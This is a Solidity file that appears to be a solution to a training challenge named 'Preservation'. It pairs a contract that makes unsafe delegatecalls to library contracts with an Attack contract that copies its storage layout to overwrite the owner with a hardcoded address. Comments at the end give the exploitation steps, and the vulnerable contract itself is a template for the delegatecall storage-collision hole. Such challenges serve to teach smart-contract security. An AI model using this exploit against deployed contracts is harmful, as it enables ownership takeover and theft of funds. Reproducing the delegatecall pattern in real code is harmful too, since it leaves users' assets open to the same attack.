// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

    // public library contracts 
    address public timeZone1Library; //slot 0
    address public timeZone2Library; //slot 1
    address public owner; //slot 2
    uint storedTime; //slot 3

    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
    }
    
    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

    // Simple library contract to set the time
contract LibraryContract {

    // stores a timestamp 
    uint storedTime;  //slot 0 --> this means that when I call setFirstTime it'll modify the variable in slot 0 in the contract above i.e timeZone1Library
    //so I can set a malicious contract as timeZone1Library that way so when it gets called from setFirstTime() it sets me as the owner

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

//need to get ownership
contract Attack{
    address public timeZone1Library; //slot 0
    address public timeZone2Library; //slot 1
    address public owner; //slot 2
    uint storedTime; //slot 3


    function setTime(uint _time) public{
        owner = 0x821c692bD131b6664b9100Ed2104634147ea6f5e;
    }
}

//Attack
//Deploy Attack contract
//call setFirstTime with the Attack contracts' address so it set it up as the contract which will execute the delegatecall
//call setFirstTime with whatever so the setTime function in the Attack contract executes and sets ME as the owner